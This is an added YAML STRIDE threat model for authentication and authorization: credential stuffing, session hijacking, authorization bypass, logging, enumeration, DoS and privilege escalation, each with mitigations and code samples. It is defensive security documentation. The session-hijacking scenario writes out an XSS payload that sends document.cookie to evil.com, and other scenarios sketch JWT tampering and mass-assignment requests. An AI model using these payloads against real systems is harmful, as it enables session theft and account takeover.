@@ -1,0 +1,938 @@
+# STRIDE Threat Model: Authentication and Authorization
+# Version: 1.0
+# Last Updated: 2026-06-23
+# Issue Reference: #854, #855
+# Owner: Security Team
+
+metadata:
+  domain: authentication_authorization
+  scope: "User authentication, session management, authorization enforcement, role-based access control, API authentication, OAuth flows, and endpoint-level permissions"
+  classification: CRITICAL
+  compliance_frameworks:
+    - OWASP ASVS 4.0
+    - NIST SP 800-63B
+    - PCI DSS 3.2.1
+    - GDPR Article 32
+  dependencies:
+    - endpoint-authorization-matrix.yaml (#854)
+
+domain:
+  name: "Authentication and Authorization"
+  description: |
+    This domain is the foundation of application security, controlling all access to
+    system resources. It encompasses user authentication (verifying identity), session
+    management (maintaining authenticated state), authorization (enforcing permissions),
+    role-based access control (RBAC), and endpoint-level security enforcement as
+    documented in the endpoint authorization matrix (Issue #854).
+
+  components:
+    - User login and authentication
+    - Password management and reset
+    - Multi-factor authentication (MFA)
+    - Session token generation and validation
+    - OAuth 2.0 / OIDC integration
+    - API key management
+    - Role and permission management
+    - Endpoint authorization enforcement
+    - Authorization matrix implementation
+    - Session lifecycle and expiration
+    - Account lockout and security controls
+
+protected_assets:
+  - asset: "User credentials (passwords, password hashes)"
+    confidentiality: CRITICAL
+    integrity: CRITICAL
+    availability: HIGH
+    data_classification: HIGHLY_CONFIDENTIAL
+
+  - asset: "Session tokens and authentication cookies"
+    confidentiality: CRITICAL
+    integrity: CRITICAL
+    availability: CRITICAL
+    data_classification: HIGHLY_CONFIDENTIAL
+
+  - asset: "API keys and OAuth tokens"
+    confidentiality: CRITICAL
+    integrity: CRITICAL
+    availability: HIGH
+    data_classification: HIGHLY_CONFIDENTIAL
+
+  - asset: "Role and permission assignments"
+    confidentiality: MEDIUM
+    integrity: CRITICAL
+    availability: HIGH
+    data_classification: INTERNAL
+
+  - asset: "MFA secrets and recovery codes"
+    confidentiality: CRITICAL
+    integrity: CRITICAL
+    availability: HIGH
+    data_classification: HIGHLY_CONFIDENTIAL
+
+  - asset: "Endpoint authorization matrix (Issue #854)"
+    confidentiality: LOW
+    integrity: CRITICAL
+    availability: CRITICAL
+    data_classification: INTERNAL
+
+trust_boundaries:
+  - boundary: "Anonymous → Login (Authentication)"
+    crossing_points:
+      - /api/auth/login POST
+      - /api/auth/oauth/callback GET
+      - /api/auth/register POST
+    authentication_required: false
+    input_validation_required: CRITICAL
+    rate_limiting_required: CRITICAL
+
+  - boundary: "Authenticated → Session Management"
+    crossing_points:
+      - /api/auth/refresh POST
+      - /api/auth/logout POST
+      - /api/auth/session GET
+    authentication_required: true
+    authorization_required: true
+
+  - boundary: "Authenticated → Protected Resources"
+    crossing_points:
+      - ALL endpoints per authorization matrix (#854)
+    authentication_required: true
+    authorization_required: true
+    matrix_enforcement_required: true
+
+  - boundary: "Admins → Role Management (Write)"
+    crossing_points:
+      - /api/admin/users/:id/roles PUT
+      - /api/admin/permissions POST
+    authentication_required: true
+    authorization_required: true
+    role_required: "admin"
+    audit_required: true
+
+threats:
+  - id: AUTH-T001
+    stride_category: Spoofing
+    title: "Credential Stuffing and Brute Force Authentication Attacks - CRITICAL"
+    description: |
+      Attackers use leaked credentials from data breaches or automated brute force
+      attacks to gain unauthorized access to user accounts. Successful attacks lead
+      to account takeover, data theft, and unauthorized actions performed under
+      compromised identities.
+    vector: "Credential stuffing lists, brute force password guessing, password spray attacks"
+    attack_scenario: |
+      1. Attacker obtains leaked credentials from public data breach:
+         - 10 million email:password pairs from breach database
+         - Common passwords: "Password123", "admin123", etc.
+      2. Uses automated tool (Sentry MBA, SNIPR) to test credentials
+      3. Targets login endpoint: /api/auth/login
+      4. No rate limiting or CAPTCHA present
+      5. Tests 1000 credentials per minute
+      6. Successfully authenticates with 2-5% of accounts (20,000-50,000 accounts)
+      7. Attacker gains access to user data, performs unauthorized actions
+      8. Sells compromised accounts on dark web
+      9. Users unaware until notified of suspicious activity
+
+      OR (password spray):
+      1. Attacker enumerates valid usernames: admin@company.com, user@company.com
+      2. Tests common password against all accounts: "Summer2026!"
+      3. Avoids account lockout by targeting many accounts with few attempts each
+      4. Gains access to accounts with weak passwords
+    likelihood: CRITICAL
+    impact: CRITICAL
+    severity: CRITICAL
+    cvss_score: 9.1
+    cwe_id: CWE-307
+    affected_assets:
+      - "User credentials (passwords, password hashes)"
+      - "Session tokens and authentication cookies"
+      - "All user data accessible via compromised accounts"
+    affected_components:
+      - Login endpoint
+      - Authentication service
+      - Session management
+    primary_mitigation:
+      status: RECOMMENDED
+      control: |
+        CRITICAL - Multi-layer authentication protection:
+
+        1. Rate limiting (aggressive, layered):
+           - Per-IP: max 5 failed login attempts per 15 minutes
+           - Per-account: max 5 failed attempts per 15 minutes (before lockout)
+           - Global: max 1000 auth attempts per minute platform-wide
+           - Progressive delays: 1s, 2s, 5s, 15s, 60s between attempts
+           - Implementation: Redis-based rate limiter with sliding window
+
+        2. Account lockout policy:
+           - Temporary lockout: 30 minutes after 5 failed attempts
+           - Permanent lockout: manual review after 20 failed attempts in 24h
+           - Email notification on lockout (alert user to attack)
+           - CAPTCHA required after 3 failed attempts
+           - Unlock via email verification link
+
+        3. Password strength requirements:
+           - Minimum 12 characters (recommended 16+)
+           - Complexity: uppercase, lowercase, digit, special character
+           - Banned passwords list (HaveIBeenPwned, top 10k common passwords)
+           - Check against user's email/name (no "john" in john@example.com's password)
+           - Password history: prevent reuse of last 5 passwords
+           - Implementation: OWASP password strength library
+
+        4. Compromised credential detection:
+           - Integration with HaveIBeenPwned Passwords API
+           - Check password hash against breach database (k-anonymity)
+           - Force password reset if found in breach
+           - Proactive scanning: check all user passwords quarterly
+
+        5. Multi-factor authentication (MFA):
+           - TOTP-based (Google Authenticator, Authy)
+           - SMS backup option (less secure but better than nothing)
+           - Recovery codes (10 single-use codes)
+           - Enforce MFA for privileged accounts (admin, moderator)
+           - Optional for regular users, recommended strongly
+           - Implementation: java-otp library
+
+        6. Monitoring and alerting:
+           - Alert on credential stuffing patterns:
+             * High failure rate from single IP
+             * Distributed attacks (many IPs, low rate each)
+             * Geographic anomalies (login from unusual country)
+           - Automated IP blocking (temporary, 24h)
+           - WAF rules to detect attack patterns
+    secondary_mitigation:
+      status: RECOMMENDED
+      control: |
+        - CAPTCHA on all login attempts (hCaptcha or reCAPTCHA v3)
+        - Device fingerprinting (detect suspicious devices)
+        - Risk-based authentication (require MFA for high-risk logins)
+        - Login notification emails (alert users to new login)
+        - Impossible travel detection (login from different countries in short time)
+    additional_controls:
+      - "Passwordless authentication (WebAuthn, FIDO2) for high-security users"
+      - "Behavioral biometrics (typing patterns) for additional verification"
+      - "Threat intelligence integration (block known malicious IPs)"
+
+  - id: AUTH-T002
+    stride_category: Spoofing
+    title: "Session Hijacking via Token Theft or Fixation"
+    description: |
+      Attackers steal or fixate session tokens to impersonate legitimate users without
+      knowing their credentials. Token theft occurs via XSS (see COMM-T002), network
+      sniffing, or malware. Session fixation tricks users into using attacker-controlled
+      session IDs. Both lead to unauthorized account access.
+    vector: "XSS-based token theft, network interception, session fixation, malware"
+    attack_scenario: |
+      TOKEN THEFT:
+      1. Attacker exploits XSS vulnerability (see COMM-T002)
+      2. Injects JavaScript to steal session cookie:
+         <script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
+      3. Victim views malicious content, script executes
+      4. Session token exfiltrated to attacker's server
+      5. Attacker uses stolen token in Cookie header
+      6. Authenticates as victim without password
+      7. Access victim's data, performs unauthorized actions
+      8. Victim remains logged in, unaware of compromise
+
+      SESSION FIXATION:
+      1. Attacker obtains session ID: SID=attacker_controlled_12345
+      2. Tricks victim into using this session:
+         - Send link: https://app.com/login?SID=attacker_controlled_12345
+         - Or inject cookie via XSS
+      3. Victim logs in using the fixated session ID
+      4. Application doesn't regenerate session ID on login (vulnerability)
+      5. Attacker now knows victim's authenticated session ID
+      6. Attacker uses same session ID to access victim's account
+    likelihood: HIGH
+    impact: CRITICAL
+    severity: CRITICAL
+    cvss_score: 8.6
+    cwe_id: CWE-384
+    affected_assets:
+      - "Session tokens and authentication cookies"
+      - "All user data accessible via compromised sessions"
+    affected_components:
+      - Session management
+      - Cookie handling
+      - Authentication service
+    primary_mitigation:
+      status: RECOMMENDED
+      control: |
+        CRITICAL - Session security hardening:
+
+        1. Secure cookie attributes:
+           - HttpOnly: prevents JavaScript access (XSS mitigation)
+           - Secure: only transmitted over HTTPS
+           - SameSite=Strict: prevents CSRF attacks
+           - Domain: explicitly set to application domain
+           - Path: restrict to application path
+           - Example: Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
+
+        2. Session fixation prevention:
+           - Regenerate session ID on login (always)
+           - Regenerate on privilege escalation (user → admin)
+           - Invalidate old session ID immediately
+           - Implementation:
+             ```java
+             public void login(username, password) {
+                 authenticate(username, password);
+                 String oldSessionId = session.getId();
+                 session.invalidate();  // Kill old session
+                 session = request.getSession(true);  // New session
+                 // Never accept session ID from URL parameter
+             }
+             ```
+
+        3. Session expiration and rotation:
+           - Idle timeout: 30 minutes of inactivity
+           - Absolute timeout: 12 hours (force re-authentication)
+           - Rotate session token every 1 hour (seamless to user)
+           - Shorter timeouts for privileged sessions (admin: 15 min idle)
+
+        4. Token integrity:
+           - Use cryptographically random session IDs (128+ bits entropy)
+           - SecureRandom, not Math.random() or predictable patterns
+           - No sequential IDs or guessable tokens
+           - Bind session to user agent and IP (detect token theft):
+             * Store User-Agent and IP on session creation
+             * Validate on each request
+             * Alert/logout on mismatch
+
+        5. Defense against theft:
+           - XSS prevention (see COMM-T002) to prevent JS-based theft
+           - TLS 1.3 for all traffic (prevent network sniffing)
+           - HSTS header to enforce HTTPS
+           - No session tokens in URLs (query parameters)
+
+        6. Session revocation:
+           - Explicit logout: invalidate session immediately
+           - Global logout: "logout all devices" feature
+           - Admin capability: force-logout user (security incident)
+           - Password change: invalidate all existing sessions
+    secondary_mitigation:
+      status: RECOMMENDED
+      control: |
+        - Session activity monitoring (detect suspicious session usage)
+        - Concurrent session limits (max 5 active sessions per user)
+        - Session list for users ("Your active sessions" with device info)
+        - Anomaly detection (session used from different IP/geolocation)
+        - Per-request CSRF tokens (in addition to SameSite)
+    additional_controls:
+      - "JWT with short expiration (15 min) + refresh token pattern"
+      - "Session fingerprinting (TLS cipher, canvas fingerprint)"
+      - "Notification on new session creation"
+
+  - id: AUTH-T003
+    stride_category: Tampering
+    title: "Authorization Matrix Bypass via Missing Endpoint Checks (Issue #854)"
+    description: |
+      Endpoints missing authorization checks allow attackers to bypass the intended
+      permission model documented in the endpoint authorization matrix (Issue #854).
+      Attackers access restricted functionality or data by directly calling unprotected
+      endpoints, violating the principle of least privilege and exposing sensitive operations.
+    vector: "Direct API calls to unprotected endpoints, missing @RolesAllowed annotations"
+    attack_scenario: |
+      1. Endpoint authorization matrix (#854) documents required roles per endpoint:
+         - /api/admin/users requires "admin" role
+         - /api/moderator/reports requires "moderator" role
+      2. Developer forgets to add @RolesAllowed annotation to new endpoint
+      3. Attacker discovers unprotected endpoint via enumeration or code review
+      4. Regular user directly calls admin endpoint:
+         POST /api/admin/users/123/promote-to-admin
+      5. No authorization check performed
+      6. Regular user successfully promotes themselves to admin
+      7. Full system compromise (admin access to all resources)
+
+      OR (missing permission check in service layer):
+      1. Endpoint has @RolesAllowed("user") but should check ownership
+      2. Attacker calls: DELETE /api/users/456/account (other user's account)
+      3. Endpoint verifies user is authenticated but not that they own account 456
+      4. Unauthorized deletion of other users' accounts
+    likelihood: MEDIUM
+    impact: CRITICAL
+    severity: CRITICAL
+    cvss_score: 8.9
+    cwe_id: CWE-862
+    affected_assets:
+      - "Endpoint authorization matrix (Issue #854)"
+      - "All protected resources and operations"
+      - "Role and permission assignments"
+    affected_components:
+      - All API endpoints
+      - Authorization enforcement layer
+      - Service layer access controls
+    primary_mitigation:
+      status: RECOMMENDED
+      control: |
+        CRITICAL - Comprehensive authorization enforcement (Issue #854):
+
+        1. Endpoint-level authorization (per matrix #854):
+           - @RolesAllowed annotation on ALL endpoints (except public)
+           - No endpoints without explicit authorization declaration
+           - CI/CD enforcement:
+             ```bash
+             # Fail build if endpoint lacks authorization annotation
+             grep -r "@Path" --include="*.java" | while read endpoint; do
+                 if ! grep -A10 "$endpoint" | grep -q "@RolesAllowed\\|@PermitAll"; then
+                     echo "ERROR: $endpoint missing authorization annotation"
+                     exit 1
+                 fi
+             done
+             ```
+
+        2. Authorization matrix automation:
+           - Generate test cases from matrix (#854)
+           - Automated tests verify each endpoint requires documented role
+           - Example test:
+             ```java
+             @Test
+             public void testAdminEndpointRequiresAdminRole() {
+                 Response r = target("/api/admin/users")
+                     .request()
+                     .header("Authorization", regularUserToken)
+                     .get();
+                 assertEquals(403, r.getStatus());  // Forbidden
+             }
+             ```
+           - Run on every commit (CI/CD integration)
+
+        3. Service-layer authorization (defense in depth):
+           - Authorization checks at both endpoint and service layer
+           - Example:
+             ```java
+             // Endpoint layer
+             @DELETE
+             @Path("/users/{id}")
+             @RolesAllowed("user")
+             public Response deleteUser(@PathParam("id") userId,
+                                        @Context SecurityContext sec) {
+                 userService.deleteUser(userId, sec.getUserPrincipal());
+                 return Response.ok().build();
+             }
+
+             // Service layer
+             public void deleteUser(userId, currentUser) {
+                 if (!userId.equals(currentUser.id) && !currentUser.hasRole("admin")) {
+                     throw new ForbiddenException("Can only delete own account");
+                 }
+                 userRepo.delete(userId);
+             }
+             ```
+
+        4. Default-deny authorization:
+           - All endpoints default to deny (403 Forbidden)
+           - Require explicit @PermitAll for public endpoints
+           - No implicit allow
+
+        5. Authorization matrix validation:
+           - Quarterly review of authorization matrix (#854)
+           - Compare matrix to actual endpoint implementations
+           - Flag discrepancies (endpoints not in matrix, or matrix entries without endpoint)
+
+        6. Code review checklist:
+           - Every new endpoint requires authorization annotation
+           - Every PR adding endpoints flagged for security review
+           - Automated comment on PR: "New endpoint detected, verify authorization matrix updated"
+    secondary_mitigation:
+      status: RECOMMENDED
+      control: |
+        - Centralized authorization service (single source of truth)
+        - Authorization logs (who accessed what, when)
+        - Periodic penetration testing for authorization bypass
+        - WAF rules to detect unauthorized access patterns
+    additional_controls:
+      - "Attribute-based access control (ABAC) for fine-grained permissions"
+      - "Runtime authorization monitoring and alerting"
+      - "Authorization policy as code (Open Policy Agent)"
+
+  - id: AUTH-T004
+    stride_category: Repudiation
+    title: "Insufficient Audit Logging of Authentication Events"
+    description: |
+      Missing or incomplete audit logs for authentication and authorization events
+      prevent detection of attacks, forensic investigation, and compliance reporting.
+      Attackers can exploit authentication vulnerabilities without detection, and
+      security incidents cannot be properly investigated.
+    vector: "Missing audit logs, incomplete logging, log tampering"
+    attack_scenario: |
+      1. Attacker performs credential stuffing attack (AUTH-T001)
+      2. Successfully compromises 100 accounts over 2 weeks
+      3. No authentication logs exist (login success/failure not logged)
+      4. Attacker steals sensitive data from compromised accounts
+      5. Incident detected when user reports suspicious activity
+      6. Security team investigates but finds no logs
+      7. Cannot determine:
+         - When accounts were compromised
+         - Which accounts were accessed
+         - What data was stolen
+         - Attack source (IP addresses, patterns)
+      8. Cannot report to compliance (GDPR breach notification requires evidence)
+      9. Legal liability (inability to demonstrate security controls)
+    likelihood: MEDIUM
+    impact: HIGH
+    severity: HIGH
+    cvss_score: 6.8
+    cwe_id: CWE-778
+    affected_assets:
+      - "Authentication audit trail"
+      - "All security-sensitive operations"
+      - "Compliance evidence"
+    affected_components:
+      - Logging infrastructure
+      - SIEM integration
+      - Audit trail storage
+    primary_mitigation:
+      status: RECOMMENDED
+      control: |
+        Comprehensive authentication and authorization audit logging:
+
+        1. Authentication events to log (ALL):
+           - Login attempts (success and failure):
+             * timestamp, user_id/email, IP, User-Agent, geo_location
+             * success/failure, failure_reason (invalid password, account locked)
+           - Login success:
+             * session_id, device_fingerprint, MFA_used (true/false)
+           - Logout events:
+             * timestamp, user_id, session_id, logout_type (explicit, timeout)
+           - Password changes/resets:
+             * timestamp, user_id, IP, reset_method (email link, security questions)
+           - MFA events:
+             * MFA enrollment, MFA verification (success/failure)
+             * Recovery code usage
+           - Account lockouts:
+             * timestamp, user_id, reason (brute force, admin action)
+
+        2. Authorization events to log:
+           - Role/permission changes:
+             * timestamp, admin_id, target_user_id, old_roles, new_roles
+           - Authorization failures:
+             * timestamp, user_id, endpoint, required_role, actual_role
+             * 403 Forbidden responses
+           - Privilege escalation attempts:
+             * unauthorized role assumption, admin endpoint access by non-admin
+
+        3. Log format and storage:
+           - Structured logs (JSON) for machine parsing
+           - Centralized logging (ELK stack, Splunk, CloudWatch)
+           - Immutable audit trail (append-only, tamper-evident)
+           - Retention: 1 year minimum (compliance requirement)
+           - Encryption at rest (audit logs contain PII)
+           - Access controls: admin-only access to logs
+
+        4. Real-time monitoring and alerting:
+           - Alert on suspicious patterns:
+             * 10+ failed logins for single account in 15 minutes
+             * 100+ failed logins from single IP in 1 hour
+             * Login from blacklisted country
+             * Login from TOR exit node
+             * Impossible travel (login from US, then China 10 min later)
+           - SIEM integration (Security Information and Event Management)
+           - Automated incident creation for critical alerts
+
+        5. Compliance reporting:
+           - Automated reports: authentication events per user, per period
+           - Audit trail exports (CSV, JSON) for compliance audits
+           - Dashboards: login success rate, MFA adoption, failed login trends
+    secondary_mitigation:
+      status: RECOMMENDED
+      control: |
+        - Log integrity monitoring (detect tampering)
+        - Separate logging infrastructure (prevent attacker from deleting logs)
+        - Backup logs to separate system (air-gapped or different cloud account)
+        - Legal hold capability (preserve logs for litigation)
+    additional_controls:
+      - "User activity dashboard (users can see own login history)"
+      - "Anomaly detection on authentication patterns"
+      - "Quarterly log review and analysis"
+
+  - id: AUTH-T005
+    stride_category: Information Disclosure
+    title: "Account Enumeration via Login Timing and Error Messages"
+    description: |
+      Differential responses to valid vs. invalid usernames allow attackers to enumerate
+      valid accounts. Timing differences in password validation or distinct error messages
+      ("Invalid username" vs. "Invalid password") reveal which usernames exist in the
+      system, enabling targeted attacks.
+    vector: "Response timing analysis, error message differences, forgot password probing"
+    attack_scenario: |
+      1. Attacker tests if email exists in system: admin@company.com
+      2. Sends login request with email and random password
+      3. Application responds differently for valid vs. invalid users:
+         - Valid user: "Invalid password" (500ms response time)
+         - Invalid user: "User not found" (50ms response time, no password hash check)
+      4. Attacker detects timing difference or error message difference
+      5. Confirms admin@company.com exists in system
+      6. Enumerates all company employees: john@company.com, jane@company.com, etc.
+      7. Builds list of valid accounts for targeted credential stuffing
+      8. Focuses attacks on known-valid accounts (higher success rate)
+
+      OR (forgot password enumeration):
+      1. Attacker uses "Forgot Password" feature
+      2. Enters email: user@example.com
+      3. Application responds:
+         - Valid user: "Password reset email sent to user@example.com"
+         - Invalid user: "Email not found in our system"
+      4. Attacker enumerates all valid emails via forgot password
+    likelihood: MEDIUM
+    impact: LOW
+    severity: LOW
+    cvss_score: 4.3
+    cwe_id: CWE-203
+    affected_assets:
+      - "User account existence information"
+      - "Email addresses in system"
+    affected_components:
+      - Login endpoint
+      - Password reset endpoint
+      - Error message handling
+    primary_mitigation:
+      status: RECOMMENDED
+      control: |
+        Account enumeration prevention:
+
+        1. Consistent error messages:
+           - Always return generic error: "Invalid email or password"
+           - Never reveal which field was incorrect
+           - Same message for invalid email and invalid password
+
+        2. Constant-time password validation:
+           - Always perform password hash check, even for invalid users
+           - Use dummy hash comparison for non-existent users:
+             ```java
+             public boolean authenticate(email, password) {
+                 User user = userRepo.findByEmail(email);
+                 String hashToCompare = user != null
+                     ? user.passwordHash
+                     : "$2a$12$dummy_hash_for_timing_consistency";
+
+                 boolean valid = BCrypt.checkpw(password, hashToCompare);
+                 return user != null && valid;
+             }
+             ```
+           - Ensures consistent response time (~500ms) regardless of user existence
+
+        3. Forgot password protection:
+           - Always respond: "If that email is in our system, we sent a reset link"
+           - Never confirm or deny email existence
+           - Same response time for valid and invalid emails
+           - Rate limit: max 3 reset requests per email per hour
+
+        4. Registration endpoint protection:
+           - Generic error: "Registration failed" (don't say "email already exists")
+           - Or: allow registration flow but send different email:
+             * Existing user: "Your account already exists, login here"
+             * New user: "Confirm your email to complete registration"
+
+        5. Rate limiting (prevent mass enumeration):
+           - Max 20 login attempts per IP per hour
+           - Max 10 forgot password requests per IP per hour
+           - CAPTCHA after 5 failed attempts
+    secondary_mitigation:
+      status: RECOMMENDED
+      control: |
+        - Timing attack mitigation (add random delay: 50-150ms)
+        - Email obfuscation in responses: "u***@e****e.com"
+        - Block enumeration tools (detect automated probing)
+        - Honeypot accounts (detect enumeration attempts)
+    additional_controls:
+      - "Monitor for mass enumeration patterns"
+      - "Alert on systematic account probing"
+      - "Consider email-free registration (username only)"
+
+  - id: AUTH-T006
+    stride_category: Denial of Service
+    title: "Authentication Service Exhaustion via Resource-Intensive Operations"
+    description: |
+      Password hashing (bcrypt, scrypt) is intentionally CPU-intensive. Attackers
+      can exploit this by flooding authentication endpoints, causing CPU exhaustion,
+      degrading service performance, or complete denial of service for legitimate users.
+    vector: "Mass login requests, password verification flooding, hash algorithm DoS"
+    attack_scenario: |
+      1. Attacker discovers login endpoint: /api/auth/login
+      2. Each login request triggers bcrypt password verification:
+         - Cost factor 12 = ~300ms CPU per request
+      3. Attacker sends 1000 concurrent login requests
+      4. Server spawns 1000 threads, each performing bcrypt:
+         - Total: 1000 × 300ms = 300 seconds of CPU time
+      5. Server CPU utilization: 100% (all cores saturated)
+      6. Legitimate login requests timeout or fail
+      7. Users cannot authenticate
+      8. Service effectively offline for authentication
+      9. Reputational damage, SLA violations
+    likelihood: MEDIUM
+    impact: MEDIUM
+    severity: MEDIUM
+    cvss_score: 5.9
+    cwe_id: CWE-400
+    affected_assets:
+      - "Authentication service availability"
+      - "Server CPU and memory resources"
+      - "User experience"
+    affected_components:
+      - Login endpoint
+      - Password hashing service
+      - Authentication infrastructure
+    primary_mitigation:
+      status: RECOMMENDED
+      control: |
+        Authentication DoS protection:
+
+        1. Aggressive rate limiting (see AUTH-T001):
+           - Per-IP: max 5 login attempts per 15 minutes
+           - Global: max 1000 concurrent auth requests
+           - Queue depth limit: reject if queue > 100 requests
+           - Fail fast: return 429 Too Many Requests immediately
+
+        2. Resource quotas and circuit breakers:
+           - Max concurrent password verifications: 50
+           - Thread pool size limit for authentication
+           - Circuit breaker: if auth latency > 5s, stop accepting new requests
+           - Graceful degradation: queue low-priority requests
+
+        3. CAPTCHA requirements:
+           - Require CAPTCHA after 3 failed attempts (see AUTH-T001)
+           - Require for all requests during attack (automatic enablement)
+           - hCaptcha or reCAPTCHA v3
+
+        4. Asynchronous password verification:
+           - Offload password hashing to background worker queue
+           - Return to user quickly: "Verifying credentials..."
+           - Prevents blocking of web threads
+           - Message queue: RabbitMQ, Redis Queue
+
+        5. Adaptive hash cost:
+           - Monitor authentication service load
+           - If CPU > 80%, reduce bcrypt cost temporarily (12 → 10)
+           - Trade security for availability during attack
+           - Restore normal cost when load decreases
+
+        6. WAF protection:
+           - Web Application Firewall rules to detect auth floods
+           - Automatic IP blocking for suspicious patterns
+           - Rate limiting at edge (before reaching application)
+    secondary_mitigation:
+      status: RECOMMENDED
+      control: |
+        - CDN/reverse proxy rate limiting (Cloudflare, Akamai)
+        - DDoS protection service (automatic mitigation)
+        - Auto-scaling authentication workers (horizontal scaling)
+        - Health checks: disable instance if CPU > 90%
+    additional_controls:
+      - "Authentication service monitoring (latency, throughput, error rate)"
+      - "Alerting on abnormal authentication load"
+      - "Incident response playbook for auth DoS"
+
+  - id: AUTH-T007
+    stride_category: Elevation of Privilege
+    title: "Privilege Escalation via Role Manipulation or JWT Tampering"
+    description: |
+      Vulnerabilities in role management or JWT validation allow attackers to escalate
+      privileges from regular user to admin/moderator. JWT tampering (changing role claims),
+      mass assignment vulnerabilities, or flawed role assignment logic enable unauthorized
+      administrative access.
+    vector: "JWT claim manipulation, mass assignment, role assignment vulnerabilities"
+    attack_scenario: |
+      JWT TAMPERING:
+      1. User logs in, receives JWT with role claim:
+         {"sub": "user123", "role": "user", "exp": 1719200000}
+      2. JWT is signed but attacker modifies payload:
+         {"sub": "user123", "role": "admin", "exp": 1719200000}
+      3. Application doesn't verify signature properly (vulnerability)
+      4. Accepts tampered JWT with "admin" role
+      5. User gains admin privileges without authorization
+      6. Full system compromise
+
+      MASS ASSIGNMENT:
+      1. User updates profile: PUT /api/users/123
+      2. Request body: {"name": "Alice", "role": "admin"}
+      3. Application directly binds request to User object (vulnerability):
+         user.update(requestBody)  // Updates all fields including role
+      4. User's role changed to "admin" via mass assignment
+      5. Unauthorized privilege escalation
+
+      ROLE ASSIGNMENT FLAW:
+      1. Admin promotes user to moderator: POST /api/admin/users/123/roles
+      2. Authorization check missing or flawed
+      3. Regular user calls same endpoint to promote themselves
+      4. Privilege escalation to moderator or admin
+    likelihood: LOW
+    impact: CRITICAL
+    severity: CRITICAL
+    cvss_score: 9.2
+    cwe_id: CWE-269
+    affected_assets:
+      - "Role and permission assignments"
+      - "All system resources and data"
+      - "Administrative functions"
+    affected_components:
+      - JWT generation and validation
+      - Role assignment endpoints
+      - User update logic
+    primary_mitigation:
+      status: RECOMMENDED
+      control: |
+        CRITICAL - Privilege escalation prevention:
+
+        1. JWT security (if using JWTs):
+           - Always verify JWT signature (RS256 or HS256)
+           - Use robust JWT library (nimbus-jose-jwt, jsonwebtoken)
+           - Verify signature on EVERY request:
+             ```java
+             public Claims validateJWT(String token) {
+                 try {
+                     return Jwts.parser()
+                         .setSigningKey(SECRET_KEY)
+                         .parseClaimsJws(token)
+                         .getBody();  // Throws exception if signature invalid
+                 } catch (JwtException e) {
+                     throw new UnauthorizedException("Invalid token");
+                 }
+             }
+             ```
+           - Short expiration (15 min) with refresh token pattern
+           - Include token ID (jti) to enable revocation
+           - Store user roles server-side, not just in JWT claims
+
+        2. Mass assignment prevention:
+           - Whitelist fields for user updates (never allow "role" field)
+           - Data Transfer Objects (DTOs) for input:
+             ```java
+             public class UserUpdateDTO {
+                 public String name;
+                 public String email;
+                 // No "role" field - cannot be mass-assigned
+             }
+             ```
+           - Separate endpoints for role management (admin-only)
+
+        3. Role assignment authorization:
+           - Strict RBAC: only admins can modify roles
+           - @RolesAllowed("admin") on role assignment endpoints
+           - Audit log all role changes (who, what, when)
+           - Two-admin approval for critical role assignments
+           - Cannot assign role higher than your own (admin cannot create super-admin)
+
+        4. Server-side role enforcement:
+           - Fetch user roles from database on each request (authoritative source)
+           - Don't trust client-provided roles (even in JWT)
+           - Cache roles with short TTL (5 min)
+
+        5. Privilege escalation detection:
+           - Alert on role changes, especially to admin
+           - Alert on admin actions by recently-promoted users
+           - Monitor JWT claims for anomalies (role changed mid-session)
+           - Automatic investigation workflow for suspicious promotions
+
+        6. Separation of duties:
+           - Role assignment and permission grants separate
+           - Cannot grant permission to yourself
+           - Admin cannot modify own roles (requires another admin)
+    secondary_mitigation:
+      status: RECOMMENDED
+      control: |
+        - Regular privilege audit (quarterly review of admin accounts)
+        - Penetration testing for privilege escalation
+        - Code review for mass assignment vulnerabilities
+        - JWT secret rotation (monthly)
+    additional_controls:
+      - "Just-in-time (JIT) admin access (temporary elevation)"
+      - "Approval workflow for role changes (ticketing system)"
+      - "Privileged access management (PAM) solution"
+
+prioritization:
+  critical:
+    - AUTH-T001  # Credential stuffing - highest likelihood and impact
+    - AUTH-T002  # Session hijacking - critical impact
+    - AUTH-T003  # Authorization matrix bypass (Issue #854)
+    - AUTH-T007  # Privilege escalation
+  high:
+    - AUTH-T004  # Insufficient audit logging
+  medium:
+    - AUTH-T006  # Authentication DoS
+  low:
+    - AUTH-T005  # Account enumeration
+
+compliance_mapping:
+  OWASP_ASVS_4.0:
+    - V2.1: Password Security (AUTH-T001)
+    - V2.2: General Authenticator Security (AUTH-T001, AUTH-T002)
+    - V2.5: Credential Recovery (AUTH-T005)
+    - V2.7: Out of Band Verifier (AUTH-T001 MFA)
+    - V3.2: Session Binding (AUTH-T002)
+    - V3.3: Session Timeout (AUTH-T002)
+    - V4.1: Access Control Design (AUTH-T003, AUTH-T007)
+    - V4.2: Operation Level Access Control (AUTH-T003)
+    - V7.1: Log Content Requirements (AUTH-T004)
+
+  NIST_SP_800_63B:
+    - 5.1.1: Memorized Secret Verifiers (AUTH-T001)
+    - 5.2.2: Multi-Factor Authenticators (AUTH-T001)
+    - 7.1: Session Management (AUTH-T002)
+    - 7.2: Reauthentication (AUTH-T002)
+
+  PCI_DSS_3.2.1:
+    - 8.1: Unique User Identification (AUTH-T005)
+    - 8.2: User Authentication (AUTH-T001, AUTH-T002)
+    - 8.3: Multi-Factor Authentication (AUTH-T001)
+    - 10.2: Audit Trail (AUTH-T004)
+
+  GDPR:
+    - Article 32: Security of Processing (all threats)
+    - Article 33: Breach Notification (AUTH-T004 logging required)
+
+metrics:
+  total_threats: 7
+  by_stride:
+    spoofing: 2
+    tampering: 1
+    repudiation: 1
+    information_disclosure: 1
+    denial_of_service: 1
+    elevation_of_privilege: 1
+  by_severity:
+    critical: 4
+    high: 1
+    medium: 1
+    low: 1
+
+  risk_score: 9.2/10
+  remediation_effort: VERY_HIGH
+  estimated_hours: 160
+
+mitigation_summary:
+  existing: 0
+  partial: 0
+  recommended: 21
+  planned: 0
+
+review_schedule:
+  initial_review: 2026-06-23
+  next_review: 2026-07-23
+  review_frequency: MONTHLY
+  review_triggers:
+    - Authentication mechanism changes
+    - New authentication provider added (OAuth, SAML)
+    - Security incident (account compromise, breach)
+    - Authorization matrix update (Issue #854)
+    - Compliance audit scheduled
+    - Critical authentication vulnerability discovered (industry-wide)
+
+notes: |
+  CRITICAL PRIORITY: Authentication is the highest-risk domain. All threats rated
+  CRITICAL or HIGH must be addressed before production launch.
+
+  Issue #854 (endpoint authorization matrix) is foundational to AUTH-T003. The matrix
+  must be implemented and tested comprehensively. Authorization testing should be
+  automated from the matrix specification.
+
